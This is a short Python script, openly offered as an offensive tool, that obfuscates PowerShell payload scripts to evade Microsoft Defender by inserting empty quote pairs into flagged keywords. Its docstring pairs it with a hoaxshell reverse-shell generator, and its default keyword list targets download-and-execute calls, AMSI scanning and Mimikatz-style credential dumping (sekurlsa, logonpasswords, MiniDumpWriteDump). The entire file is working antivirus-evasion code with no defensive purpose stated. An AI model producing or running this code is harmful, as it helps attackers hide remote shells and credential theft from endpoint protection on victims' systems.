import argparse
import re
import random

"""
This script escapes powershell key functions to evade Defender (AV).

Example: generate a revershell
python hoaxshell.py -s 1.2.3.4 -r -o

python defender_ps1_escaper.py -f hoaxshell.ps1 -o hoaxshell_escaped.ps1
"""

DEFAULT_WORDS="IEX,Invoke,DownloadString,FromBase64String,MiniDumpWriteDump,ReadProcessMemory,sekurlsa,logonpasswords,AmsiScanBuffer,System.Net.WebClient"

def insert_quotes(arg1: str) -> str:
    n = len(arg1)
    if n <= 1:
        return arg1

    # determine how many insertions
    if n <= 3:
        inserts = 1
    elif n <= 6:
        inserts = 2
    elif n <= 8:
        inserts = 3
    else:
        inserts = 3  # cap at 3 for >=9

    slots = list(range(n - 1))  # possible positions
    chosen = set()

    while len(chosen) < inserts:
        pos = random.choice(slots)
        # ensure not adjacent
        if (pos - 1 not in chosen) and (pos + 1 not in chosen):
            chosen.add(pos)

    result = []
    for i, ch in enumerate(arg1):
        result.append(ch)
        if i in chosen:
            result.append("''")
    return "".join(result)


def process_file(filename: str, words: list[str], output: str):
    with open(filename, "r", encoding="utf-8") as f:
        text = f.read()

    for word in words:
        pattern = re.compile(rf"\b{re.escape(word)}\b", re.IGNORECASE)

        def replacer(match):
            return insert_quotes(match.group(0))

        text = pattern.sub(replacer, text)

    with open(output, "w", encoding="utf-8") as f:
        f.write(text)

    print(f"Processed file written to {output}")


def main():
    parser = argparse.ArgumentParser(description="Randomly insert '' inside words.")
    parser.add_argument("-f", "--file", required=True, help="Input file path")
    parser.add_argument(
        "-w", "--words",
        default=DEFAULT_WORDS,
        help="Comma-separated list of words to replace (default: word1,word2,word3)"
    )
    parser.add_argument(
        "-o", "--output",
        default="output.txt",
        help="Output file path (default: output.txt)"
    )
    args = parser.parse_args()

    words = [w.strip() for w in args.words.split(",") if w.strip()]
    process_file(args.file, words, args.output)


if __name__ == "__main__":
    main()

